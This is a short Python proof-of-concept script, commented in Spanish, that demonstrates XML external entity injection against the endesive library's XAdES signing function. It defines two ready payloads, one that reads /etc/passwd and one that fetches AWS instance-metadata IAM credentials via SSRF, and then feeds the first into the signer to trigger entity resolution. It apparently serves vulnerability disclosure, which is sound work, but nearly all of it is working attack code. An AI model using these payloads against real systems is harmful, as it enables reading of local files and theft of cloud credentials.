# XXE lectura de fichero local
xml0 = b'''\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<factura>
  <concepto>&xxe;</concepto>
</factura>
'''
# SSRF - metadata AWS
xml1 = b'''\
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
'''

from cryptography.hazmat import backends
from cryptography.hazmat.primitives.serialization import pkcs12

from endesive.xades.bes import BES

with open("examples/ca/demo2_user1.p12", "rb") as fp:
    p12 = pkcs12.load_key_and_certificates(
        fp.read(), b"1234", backends.default_backend()
    )

bes = BES()
# 'data' es el XML malicioso de arriba (bytes)
signed_root = bes.enveloped(
    data=xml0,
    cert=p12[0],
    certcontent=p12[1],
    signproc=lambda x,a: b'',
    tspurl=None,
    tspcred=None
)

# > Resultado: la entidad se resuelve durante etree.parse en bes.py:221
xml = etree.tostring(
    signed_root, encoding="UTF-8", xml_declaration=True, standalone=False
)
print(xml)
